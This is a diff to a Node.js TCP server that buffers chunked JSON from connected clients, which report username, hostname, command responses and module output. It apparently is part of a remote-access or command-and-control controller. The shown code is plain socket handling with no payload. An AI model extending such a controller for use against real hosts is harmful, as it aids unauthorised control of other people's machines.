@@ -143,43 +143,52 @@ app.get('/file', (req, res) => {
 	});
 });
 
-// server creation and management
 const server = net.createServer((socket) => {
-        // creation of client object
-        const id = Math.random().toString(36).substring(7);
-        let newClient = new Client(socket, id);
-        clients.push(newClient);
-        updateMaps();
+	const id = Math.random().toString(36).substring(7);
+	let newClient = new Client(socket, id);
+	clients.push(newClient);
+	updateMaps();
 
-        socket.on('data', (data) => {
-                const parsedData = JSON.parse(data);
-                const client = idClientMap[socketIdMap[socket]];
-                switch (parsedData['type']) {
-                        case 'response':
-                                outputBuffer.add(parsedData.data);
-                                break;
-			case 'response_module':
-				log(parsedData.data)
-				infoBuffer.add(`${client.username}@${client.hostname} has module output which has also been logged: \n ${parsedData.data}`);
-                        	break;
-			case 'establishment':
-                                try {
-                                        const { username, hostname } = parsedData.data;
-                                        client.establish(username, hostname);
-                                } catch (err) {
-                                        infoBuffer.add("ERROR ESTABLISHING CLIENT: \n " + err);
-                                }
-				break;
-                }
-        });
+	let fullData = '';
 
-        socket.on('end', () => {
-        	// Create a new array without the client
+	socket.on('data', (chunk) => {
+		fullData += chunk.toString();
+
+		if (fullData.endsWith('}')) {
+			try {
+				const parsedData = JSON.parse(fullData);
+				const client = idClientMap[socketIdMap[socket]];
+
+				switch (parsedData['type']) {
+					case 'response':
+						outputBuffer.add(parsedData.data);
+						break;
+				case 'response_module':
+					log(parsedData.data);
+					infoBuffer.add(`${client.username}@${client.hostname} has module output which has also been logged: \n ${parsedData.data}`);
+					break;
+				case 'establishment':
+					try {
+						const { username, hostname } = parsedData.data;
+						client.establish(username, hostname);
+					} catch (err) {
+						infoBuffer.add("ERROR ESTABLISHING CLIENT: \n " + err);
+					}
+					break;							                
+				}
+
+				fullData = '';
+			} catch (error) {
+				console.error('Failed to parse JSON data:', error);
+			}
+		}
+	});
+
+	socket.on('end', () => {
 		clients = clients.filter(client => client !== newClient);
 		currentId = "";
 		infoBuffer.add(`Client ${newClient.id} disconnected`);
 	});
-
 });
 
 server.listen(webSocketPort, () => { });
